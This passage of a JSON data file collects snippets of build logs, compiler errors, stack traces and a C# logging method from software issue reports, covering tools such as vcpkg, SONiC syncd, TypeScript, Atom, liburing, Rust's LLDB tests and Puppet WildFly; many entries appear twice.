populated but is not, this might indicate an error in the portfile.\r\nIf the directories are not needed and their creation cannot be disabled, use something like this in the portfile to remove them:\r\n\r\n    file(REMOVE_RECURSE ${CURRENT_PACKAGES_DIR}/a/dir ${CURRENT_PACKAGES_DIR}/some/other/dir)\r\n\r\n\r\nFound 1 error(s). Please correct the portfile:\r\n    /Users/buccim2/Development/Squally/src/vcpkg/ports/breakpad/portfile.cmake\r\n-- Performing post-build validation done\r\nError: Building package breakpad:x64-osx failed with: POST_BUILD_CHECKS_FAILED\r\nPlease ensure you're using the latest portfiles with "
    },
    {
        "logs": ", then\r\nsubmit an issue at https://github.com/Microsoft/vcpkg/issues including:\r\n  Package: breakpad:x64-osx\r\n  Vcpkg version: 2018.11.23-501abecda7b9997d4492a08114b0a94e78b46007"
    },
    {
        "logs": ".\r\n\r\nThat approach has the advantage of keeping the environment clean and only changing the PATH. The disadvantage is that it is messing a "
    },
    {
        "logs": "\" a lot in my current research on flakes. \"Your [shared investigation on NixFlakes](https://username_1.com/NixFlakes/) in understandable terms might be a good place for clarification\", my intution alleges.\r\n\r\nThere are ongoing caveats about building development shells to which I'd like to corss reference. The quid of the issue is that historically, ["
    },
    {
        "logs": " has conflated two similar but separated use cases](https://github.com/NixOS/nix/pull/3833#issuecomment-660990812). Hence, any implementation of the current "
    },
    {
        "logs": "Jul 24 15:32:37.355679 sonic ERR syncd[26]: :- guard: RedisReply catches system_error: command: *39#015#012$7#015#012EVALSHA#015#012$40#015#012fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4#015#012$2#015#01232#015#012$19#015#012oid:0x600000000034f#015#012$19#015#012oid:0x6000000000350#015#012$19#015#012oid:0x6000000000351#015#012$19#015#012oid:0x6000000000352#015#012$19#015#012oid:0x6000000000353#015#012$19#015#012oid:0x6000000000354#015#012$19#015#012oid:0x6000000000355#015#012$19#015#012oid:0x6000000000356#015#012$19#015#012oid:0x6000000000357#015#012$19#015#012oid:0x6000000000358#015#012$19#015#012oid:0x6000000000359#015#012$19#015#012oid:0x600000000035a#015#012$19#015#012oid:0x600000000035b#015#012$19#015#012oid:0x600000000035c#015#012$19#015#012oid:0x600000000035d#015#012$19#015#012oid:0x600000000035e#015#012$19#015#012oid:0x600000000035f#015#012$19#015#012oid:0x6000000000360#015#012$19#015#012oid:0x6000000000361#015#012$19#015#012oid:0x6000000000362#015#012$19#015#012oid:0x6000000000363#015#012$19#015#012oid:0x6000000000364#015#012$19#015#012oid:0x6000000000365#015#012$19#015#012oid:0x6000000000366#015#012$19#015#012oid:0x6000000000367#015#012$19#015#012oid:0x6000000000368#015#012$19#015#012oid:0x6000000000369#015#012$19#015#012oid:0x600000000036a#015#012$19#015#012oid:0x600000000036b#015#012$19#015#012oid:0x60000000003a5#015#012$19#015#012oid:0x60000000003a6#015#012$19#015#012oid:0x60000000003a7#015#012$1#015#0122#015#012$8#015#012COUNTERS#015#012$7#015#0121000000#015#012$2#015#012''#015#012, reason: ERR Error running script (call to f_fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error\r\nJul 24 15:32:37.355679 sonic ERR syncd[26]: :- runRedisScript: Caught exception while running Redis lua script: ERR Error running script (call to f_fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error\r\nJul 24 15:32:37.978972 sonic ERR syncd[26]: :- guard: RedisReply catches system_error: command: *39#015#012$7#015#012EVALSHA#015#012$40#015#01231fc701ca9b1b9f968f501c92b639f50f6346a9c#015#012$2#015#01232#015#012$19#015#012oid:0x100000000004f#015#012$19#015#012oid:0x1000000000067#015#012$19#015#012oid:0x100000000007f#015#012$19#015#012oid:0x1000000000097#015#012$19#015#012oid:0x10000000000af#015#012$19#015#012oid:0x10000000000c7#015#012$19#015#012oid:0x10000000000df#015#012$19#015#012oid:0x10000000000f7#015#012$19#015#012oid:0x100000000010f#015#012$19#015#012oid:0x1000000000127#015#012$19#015#012oid:0x100000000013f#015#012$19#015#012oid:0x1000000000157#015#012$19#015#012oid:0x100000000016f#015#012$19#015#012oid:0x1000000000187#015#012$19#015#012oid:0x100000000019f#015#012$19#015#012oid:0x10000000001b7#015#012$19#015#012oid:0x10000000001cf#015#012$19#015#012oid:0x10000000001e7#015#012$19#015#012oid:0x10000000001ff#015#012$19#015#012oid:0x1000000000217#015#012$19#015#012oid:0x100000000022f#015#012$19#015#012oid:0x1000000000247#015#012$19#015#012oid:0x100000000025f#015#012$19#015#012oid:0x1000000000277#015#012$19#015#012oid:0x100000000028f#015#012$19#015#012oid:0x10000000002a7#015#012$19#015#012oid:0x10000000002bf#015#012$19#015#012oid:0x10000000002d7#015#012$19#015#012oid:0x10000000002ef#015#012$19#015#012oid:0x1000000000307#015#012$19#015#012oid:0x100000000031f#015#012$19#015#012oid:0x1000000000337#015#012$1#015#0122#015#012$8#015#012COUNTERS#015#012$7#015#0121000000#015#012$2#015#012''#015#012, reason: ERR Error running script (call to f_31fc701ca9b1b9f968f501c92b639f50f6346a9c): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error"
    },
    {
        "logs": "Jul 24 15:32:37.355679 sonic ERR syncd[26]: :- guard: RedisReply catches system_error: command: *39#015#012$7#015#012EVALSHA#015#012$40#015#012fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4#015#012$2#015#01232#015#012$19#015#012oid:0x600000000034f#015#012$19#015#012oid:0x6000000000350#015#012$19#015#012oid:0x6000000000351#015#012$19#015#012oid:0x6000000000352#015#012$19#015#012oid:0x6000000000353#015#012$19#015#012oid:0x6000000000354#015#012$19#015#012oid:0x6000000000355#015#012$19#015#012oid:0x6000000000356#015#012$19#015#012oid:0x6000000000357#015#012$19#015#012oid:0x6000000000358#015#012$19#015#012oid:0x6000000000359#015#012$19#015#012oid:0x600000000035a#015#012$19#015#012oid:0x600000000035b#015#012$19#015#012oid:0x600000000035c#015#012$19#015#012oid:0x600000000035d#015#012$19#015#012oid:0x600000000035e#015#012$19#015#012oid:0x600000000035f#015#012$19#015#012oid:0x6000000000360#015#012$19#015#012oid:0x6000000000361#015#012$19#015#012oid:0x6000000000362#015#012$19#015#012oid:0x6000000000363#015#012$19#015#012oid:0x6000000000364#015#012$19#015#012oid:0x6000000000365#015#012$19#015#012oid:0x6000000000366#015#012$19#015#012oid:0x6000000000367#015#012$19#015#012oid:0x6000000000368#015#012$19#015#012oid:0x6000000000369#015#012$19#015#012oid:0x600000000036a#015#012$19#015#012oid:0x600000000036b#015#012$19#015#012oid:0x60000000003a5#015#012$19#015#012oid:0x60000000003a6#015#012$19#015#012oid:0x60000000003a7#015#012$1#015#0122#015#012$8#015#012COUNTERS#015#012$7#015#0121000000#015#012$2#015#012''#015#012, reason: ERR Error running script (call to f_fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error\r\nJul 24 15:32:37.355679 sonic ERR syncd[26]: :- runRedisScript: Caught exception while running Redis lua script: ERR Error running script (call to f_fd0ea76fc13f9fcc7910e4b1fd8c9018ea197cf4): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error\r\nJul 24 15:32:37.978972 sonic ERR syncd[26]: :- guard: RedisReply catches system_error: command: *39#015#012$7#015#012EVALSHA#015#012$40#015#01231fc701ca9b1b9f968f501c92b639f50f6346a9c#015#012$2#015#01232#015#012$19#015#012oid:0x100000000004f#015#012$19#015#012oid:0x1000000000067#015#012$19#015#012oid:0x100000000007f#015#012$19#015#012oid:0x1000000000097#015#012$19#015#012oid:0x10000000000af#015#012$19#015#012oid:0x10000000000c7#015#012$19#015#012oid:0x10000000000df#015#012$19#015#012oid:0x10000000000f7#015#012$19#015#012oid:0x100000000010f#015#012$19#015#012oid:0x1000000000127#015#012$19#015#012oid:0x100000000013f#015#012$19#015#012oid:0x1000000000157#015#012$19#015#012oid:0x100000000016f#015#012$19#015#012oid:0x1000000000187#015#012$19#015#012oid:0x100000000019f#015#012$19#015#012oid:0x10000000001b7#015#012$19#015#012oid:0x10000000001cf#015#012$19#015#012oid:0x10000000001e7#015#012$19#015#012oid:0x10000000001ff#015#012$19#015#012oid:0x1000000000217#015#012$19#015#012oid:0x100000000022f#015#012$19#015#012oid:0x1000000000247#015#012$19#015#012oid:0x100000000025f#015#012$19#015#012oid:0x1000000000277#015#012$19#015#012oid:0x100000000028f#015#012$19#015#012oid:0x10000000002a7#015#012$19#015#012oid:0x10000000002bf#015#012$19#015#012oid:0x10000000002d7#015#012$19#015#012oid:0x10000000002ef#015#012$19#015#012oid:0x1000000000307#015#012$19#015#012oid:0x100000000031f#015#012$19#015#012oid:0x1000000000337#015#012$1#015#0122#015#012$8#015#012COUNTERS#015#012$7#015#0121000000#015#012$2#015#012''#015#012, reason: ERR Error running script (call to f_31fc701ca9b1b9f968f501c92b639f50f6346a9c): @user_script:21: user_script:21: attempt to perform arithmetic on local 'alpha' (a boolean value) : Input/output error"
    },
    {
        "logs": "        private static readonly DateTime MIN_TIMESTAMP_UTC_KIND = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);\r\n\r\n        /// <summary>\r\n        /// Last time an error message was registered due to overflowing in-memory buffer.\r\n        /// </summary>\r\n        private DateTime _maxBufferTimeStamp = MIN_TIMESTAMP_UTC_KIND;\r\n\r\n        /// <summary>\r\n        /// Minimum interval in minutes between two error messages on in-memory buffer overflow.\r\n        /// </summary>\r\n        const double MAX_BUFFER_TIMEDIFF = 5;"
    },
    {
        "logs": "        private void AddSingleMessage(string message, DateTime? timestamp)\r\n        {\r\n            DateTime timestampNn = timestamp ?? DateTime.Now;\r\n\r\n            if (_pendingMessageQueue.Count > _config.MaxQueuedMessages)\r\n            {\r\n                if (_maxBufferTimeStamp.AddMinutes(MAX_BUFFER_TIMEDIFF) < DateTime.UtcNow)\r\n                {\r\n                    if (_maxBufferTimeStamp == MIN_TIMESTAMP_UTC_KIND)\r\n                    {\r\n                        string errorMessage = $\"The AWS Logger in-memory buffer has reached maximum capacity of {_config.MaxQueuedMessages:N0} entries. Currently contains {_pendingMessageQueue.Count:N0} entries.\";\r\n                        LogLibraryServiceError(new System.InvalidOperationException(message));\r\n                        _pendingMessageQueue.Enqueue(new InputLogEvent\r\n                        {\r\n                            Timestamp = timestampNn,\r\n                            Message = errorMessage\r\n                        });\r\n                    }\r\n                    _maxBufferTimeStamp = DateTime.UtcNow;\r\n                }\r\n            }\r\n\r\n            _pendingMessageQueue.Enqueue(new InputLogEvent\r\n            {\r\n                Timestamp = timestampNn,\r\n                Message = message,\r\n            });\r\n        }"
    },
    {
        "logs": "        private static readonly DateTime MIN_TIMESTAMP_UTC_KIND = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);\r\n\r\n        /// <summary>\r\n        /// Last time an error message was registered due to overflowing in-memory buffer.\r\n        /// </summary>\r\n        private DateTime _maxBufferTimeStamp = MIN_TIMESTAMP_UTC_KIND;\r\n\r\n        /// <summary>\r\n        /// Minimum interval in minutes between two error messages on in-memory buffer overflow.\r\n        /// </summary>\r\n        const double MAX_BUFFER_TIMEDIFF = 5;"
    },
    {
        "logs": "        private void AddSingleMessage(string message, DateTime? timestamp)\r\n        {\r\n            DateTime timestampNn = timestamp ?? DateTime.Now;\r\n\r\n            if (_pendingMessageQueue.Count > _config.MaxQueuedMessages)\r\n            {\r\n                if (_maxBufferTimeStamp.AddMinutes(MAX_BUFFER_TIMEDIFF) < DateTime.UtcNow)\r\n                {\r\n                    if (_maxBufferTimeStamp == MIN_TIMESTAMP_UTC_KIND)\r\n                    {\r\n                        string errorMessage = $\"The AWS Logger in-memory buffer has reached maximum capacity of {_config.MaxQueuedMessages:N0} entries. Currently contains {_pendingMessageQueue.Count:N0} entries.\";\r\n                        LogLibraryServiceError(new System.InvalidOperationException(message));\r\n                        _pendingMessageQueue.Enqueue(new InputLogEvent\r\n                        {\r\n                            Timestamp = timestampNn,\r\n                            Message = errorMessage\r\n                        });\r\n                    }\r\n                    _maxBufferTimeStamp = DateTime.UtcNow;\r\n                }\r\n            }\r\n\r\n            _pendingMessageQueue.Enqueue(new InputLogEvent\r\n            {\r\n                Timestamp = timestampNn,\r\n                Message = message,\r\n            });\r\n        }"
    },
    {
        "logs": "ARS info: Invalid value for: body (No prefix expansion found for PathWhiz.Reaction:146672, No prefix expansion found for PathWhiz.Reaction:147775, No prefix expansion found for PathWhiz.Reaction:147829, No prefix expansion found for KEGG.PATHWAY:hsa00260, No prefix expansion found for PathWhiz.Reaction:1778, No prefix expansion found for PathWhiz.Reaction:146617, No prefix expansion found for BIOCARTA:ahsppathway, No prefix expansion found for PathWhiz.Reaction:148449, No prefix expansion found for PathWhiz.Reaction:149232, No prefix expansion found for KEGG.PATHWAY:hsa00860, No prefix expansion found for PathWhiz.Reaction:148504, No prefix expansion found for PathWhiz.Reaction:110250, No prefix expansion found for PathWhiz.Reaction:6637, No prefix expansion found for PathWhiz.Reaction:1871)"
    },
    {
        "logs": "node_modules/@types/node/index.d.ts(76,13): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\nnode_modules/wix-react-tools/dist/src/core/dev-mode.d.ts(2,11): error TS2451: Cannot redeclare block-scoped variable 'process'."
    },
    {
        "logs": "node_modules/@types/node/index.d.ts(76,13): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\nnode_modules/wix-react-tools/dist/src/core/dev-mode.d.ts(2,11): error TS2451: Cannot redeclare block-scoped variable 'process'."
    },
    {
        "logs": "$ snap run atom\r\nln: failed to create symbolic link '/home/ghislain/snap/atom/46/.config/gtk-2.0/gtkfilechooser.ini': File exists\r\n/usr/share/themes/Ambiance/gtk-2.0/apps/mate-panel.rc:30: error: invalid string constant \"murrine-scrollbar\", expected valid string constant\r\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\r\nbash: no job control in this shell"
    },
    {
        "logs": "$ snap run atom\r\nln: failed to create symbolic link '/home/ghislain/snap/atom/46/.config/gtk-2.0/gtkfilechooser.ini': File exists\r\n/usr/share/themes/Ambiance/gtk-2.0/apps/mate-panel.rc:30: error: invalid string constant \"murrine-scrollbar\", expected valid string constant\r\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\r\nbash: no job control in this shell"
    },
    {
        "logs": "[01:46:37] ---- [debuginfo-lldb] debuginfo/by-value-non-immediate-argument.rs stdout ----\r\n[01:46:37] \tNOTE: compiletest thinks it is using LLDB version 360\r\n[01:46:37] \r\n[01:46:37] error: Error while running LLDB\r\n[01:46:37] status: signal: 11\r\n[01:46:37] command: \"/usr/bin/python\" \"/Users/travis/build/rust-lang/rust/src/etc/lldb_batchmode.py\" \"/Users/travis/build/rust-lang/rust/build/i686-apple-darwin/test/debuginfo/by-value-non-immediate-argument.stage2-i686-apple-darwin\" \"/Users/travis/build/rust-lang/rust/build/i686-apple-darwin/test/debuginfo/by-value-non-immediate-argument.debugger.script\"\r\n[01:46:37] stdout:\r\n[01:46:37] ------------------------------------------\r\n[01:46:37] LLDB batch-mode script\r\n[01:46:37] ----------------------\r\n[01:46:37] Debugger commands script is '/Users/travis/build/rust-lang/rust/build/i686-apple-darwin/test/debuginfo/by-value-non-immediate-argument.debugger.script'.\r\n[01:46:37] Target executable is '/Users/travis/build/rust-lang/rust/build/i686-apple-darwin/test/debuginfo/by-value-non-immediate-argument.stage2-i686-apple-darwin'.\r\n[01:46:37] Current working directory is '/Users/travis/build/rust-lang/rust'\r\n[01:46:37] Creating a target for '/Users/travis/build/rust-lang/rust/build/i686-apple-darwin/test/debuginfo/by-value-non-immediate-argument.stage2-i686-apple-darwin'\r\n[01:46:37] settings set auto-confirm true\r\n[01:46:37] \r\n[01:46:37] version\r\n[01:46:37] lldb-360.1.70 \r\n[01:46:37] command script import /Users/travis/build/rust-lang/rust/./src/etc/lldb_rust_formatters.py\r\n[01:46:37] type summary add --no-value --python-function lldb_rust_formatters.print_val -x \".*\" --category Rust\r\n[01:46:37] type category enable Rust\r\n[01:46:37] \r\n[01:46:37] breakpoint set --file 'by-value-non-immediate-argument.rs' --line 94\r\n[01:46:37] Breakpoint 1: where = by-value-non-immediate-argument.stage2-i686-apple-darwin"
    },
    {
        "logs": "packages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~"
    },
    {
        "logs": "[10:24:52 AM] Starting compilation in watch mode...\r\n\r\n[10:24:52 AM] Projects in this build:\r\n    * packages/d/tsconfig.json\r\n    * packages/b/tsconfig.json\r\n    * packages/c/tsconfig.json\r\n    * tsconfig.json\r\n\r\n[10:24:52 AM] Project 'packages/d/tsconfig.json' is up to date because newest input 'packages/d/src/d.ts' is older than oldest output 'packages/d/lib/d.js.map'\r\n\r\n[10:24:52 AM] Project 'packages/b/tsconfig.json' is out of date because output file 'packages/b/lib/B.js' does not exist\r\n\r\n[10:24:52 AM] Building project 'c:/temp/typescript-monorepo/packages/b/tsconfig.json'...\r\n\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n\r\n[10:24:56 AM] Project 'packages/c/tsconfig.json' is up to date because newest input 'packages/c/src/index.ts' is older than oldest output 'packages/c/lib/index.js'\r\n\r\n[10:24:56 AM] Found 1 error. Watching for file changes."
    },
    {
        "logs": "packages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~"
    },
    {
        "logs": "[10:24:52 AM] Starting compilation in watch mode...\r\n\r\n[10:24:52 AM] Projects in this build:\r\n    * packages/d/tsconfig.json\r\n    * packages/b/tsconfig.json\r\n    * packages/c/tsconfig.json\r\n    * tsconfig.json\r\n\r\n[10:24:52 AM] Project 'packages/d/tsconfig.json' is up to date because newest input 'packages/d/src/d.ts' is older than oldest output 'packages/d/lib/d.js.map'\r\n\r\n[10:24:52 AM] Project 'packages/b/tsconfig.json' is out of date because output file 'packages/b/lib/B.js' does not exist\r\n\r\n[10:24:52 AM] Building project 'c:/temp/typescript-monorepo/packages/b/tsconfig.json'...\r\n\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n\r\n[10:24:56 AM] Project 'packages/c/tsconfig.json' is up to date because newest input 'packages/c/src/index.ts' is older than oldest output 'packages/c/lib/index.js'\r\n\r\n[10:24:56 AM] Found 1 error. Watching for file changes."
    },
    {
        "logs": "a.ts:4:3 - error TS2345: Argument of type '{ prop1: number; prop2: number; prop3: number; test(): void; accept_foo(foo: Foo): boolean; }' is not assignable to parameter of type 'Foo'.\r\n  Object literal may only specify known properties, and 'prop1' does not exist in type 'Foo'.\r\n\r\n4   prop1: 1,\r\n    ~~~~~~~~\r\n\r\n\r\nFound 1 error."
    },
    {
        "logs": "double-poll-crash.c:69: warning: \"__NR_io_uring_setup\" redefined\r\n   69 | #define __NR_io_uring_setup 425\r\n      |\r\nIn file included from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd.h:27,\r\n                 from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/sys/syscall.h:24,\r\n                 from double-poll-crash.c:12:\r\n/nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd-common.h:382: note: this is the location of the previous definition\r\n  382 | #define __NR_io_uring_setup (__NR_SYSCALL_BASE + 425)\r\n      |\r\ndouble-poll-crash.c: In function 'main':\r\ndouble-poll-crash.c:153:11: error: '__NR_mmap' undeclared (first use in this function)\r\n  153 |   syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);\r\n      |           ^~~~~~~~~\r\ndouble-poll-crash.c:153:11: note: each undeclared identifier is reported only once for each function it appears in\r\nmake[1]: *** [Makefile:144: double-poll-crash] Error 1\r\nmake[1]: Leaving directory '/build/liburing/test'\r\nmake: *** [Makefile:13: all] Error 2\r\nbuilder for '/nix/store/2z8qpmjia5jq1nibw83k9jv2xj7xhcwa-liburing-2.0.drv' failed with exit code 2"
    },
    {
        "logs": "double-poll-crash.c:69: warning: \"__NR_io_uring_setup\" redefined\r\n   69 | #define __NR_io_uring_setup 425\r\n      |\r\nIn file included from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd.h:27,\r\n                 from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/sys/syscall.h:24,\r\n                 from double-poll-crash.c:12:\r\n/nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd-common.h:382: note: this is the location of the previous definition\r\n  382 | #define __NR_io_uring_setup (__NR_SYSCALL_BASE + 425)\r\n      |\r\ndouble-poll-crash.c: In function 'main':\r\ndouble-poll-crash.c:153:11: error: '__NR_mmap' undeclared (first use in this function)\r\n  153 |   syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);\r\n      |           ^~~~~~~~~\r\ndouble-poll-crash.c:153:11: note: each undeclared identifier is reported only once for each function it appears in\r\nmake[1]: *** [Makefile:144: double-poll-crash] Error 1\r\nmake[1]: Leaving directory '/build/liburing/test'\r\nmake: *** [Makefile:13: all] Error 2\r\nbuilder for '/nix/store/2z8qpmjia5jq1nibw83k9jv2xj7xhcwa-liburing-2.0.drv' failed with exit code 2"
    },
    {
        "logs": "(node:6690) [DEP0128] DeprecationWarning: Invalid 'main' field in '<REDACTED>/node_modules/mpbasic/package.json' of '/index.js'. Please either fix that or report it to the module author\r\n(Use "
    },
    {
        "logs": "(node:6690) [DEP0128] DeprecationWarning: Invalid 'main' field in '<REDACTED>/node_modules/mpbasic/package.json' of '/index.js'. Please either fix that or report it to the module author\r\n(Use `node --trace-deprecation ...` to show where the warning was created)"
    },
    {
        "logs": " event        \r\n// Android: Doesn't get send - NO ERRORS\r\n// iOS: Gets send - NO ERRORS  \r\nanalytics.screen(\r\n          'some_screen',\r\n         null,\r\n          {\r\n            context: {\r\n              traits: {\r\n                myTrait: 'hello',\r\n              },\r\n            },\r\n          }\r\n        )"
    },
    {
        "logs": "[snip]\r\n  File \"__init__.pxd\", line 155, in init msmtools.estimation.dense.mle_trev_given_pi (msmtools/estimation/dense/mle_trev_given_pi.c:4431)\r\nValueError: numpy.dtype has the wrong size, try recompiling"
    },
    {
        "logs": "[snip]\r\n  File \"__init__.pxd\", line 155, in init msmtools.estimation.dense.mle_trev_given_pi (msmtools/estimation/dense/mle_trev_given_pi.c:4431)\r\nValueError: numpy.dtype has the wrong size, try recompiling"
    },
    {
        "logs": "Error: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nWrapped exception:\r\nFailed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"}\r\nError: /Stage[main]/Wildfly_wrapper::Config/Wildfly::Datasources::Driver[postgresql-9.2-XA]/Wildfly::Util::Resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/Wildfly_resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/ensure: change from absent to present failed: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"db2\"}],\"operation\":\"add\",\"driver-name\":\"db2\",\"driver-module-name\":\"com.ibm.db2\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"com.ibm.db2.jcc.DB2Driver\"} at 16:/modules/wildfly/manifests/util/resource.pp"
    },
    {
        "logs": "Error: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nWrapped exception:\r\nFailed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"}\r\nError: /Stage[main]/Wildfly_wrapper::Config/Wildfly::Datasources::Driver[postgresql-9.2-XA]/Wildfly::Util::Resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/Wildfly_resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/ensure: change from absent to present failed: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"db2\"}],\"operation\":\"add\",\"driver-name\":\"db2\",\"driver-module-name\":\"com.ibm.db2\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"com.ibm.db2.jcc.DB2Driver\"} at 16:/modules/wildfly/manifests/util/resource.pp"
    },
    {
        "logs": "At C:\\Users\\E157237\\AppData\\Local\\atom\\app-1.1.0\\resources\\app.asar\\src\\notification.js:25\r\n\r\nError: Notification must be created with string message: null\r\n    at Notification.module.exports.Notification.validate (C:\\Users\\E157237\\AppData\\Local\\atom\\app-1.1.0\\resources\\app.asar\\src\\notification.js:25:15)\r\n    at new Notification (C:\\Users\\E157237\\AppData\\Local\\atom\\app-1.1.0\\resources\\app.asar\\src\\notification.js:20:12)\r\n    at NotificationManager.module.exports.NotificationManager.addError (C:\\Users\\E157237\\AppData\\Local\\atom\\app-1.1.0\\resources\\app.asar\\src\\notification-manager.js:41:35)\r\n    at file:///C:/Users/E157237/.atom/packages/rubocop-auto-correct/lib/rubocop-auto-correct.coffee:95:35\r\n    at C:\\Users\\E157237\\.atom\\packages\\rubocop-auto-correct\\node_modules\\which\\which.js:91:20\r\n    at FSReqWrap.oncomplete (fs.js:82:15)"
    },
    {
        "logs": " plugin that Cruise Control depends on. This plugin seems to require the existence of a git directory for versioning (see the [code](https://github.com/username_2/gradle-semantic-build-versioning/blob/master/src/main/groovy/net/username_2/gradle/versioning/VersionUtils.groovy)). \r\n\r\n1. We filed a ticket regarding this issue in here https://github.com/username_2/gradle-semantic-build-versioning/issues/99.\r\n2. In the meantime, you may either explicitly run "
    },
    {
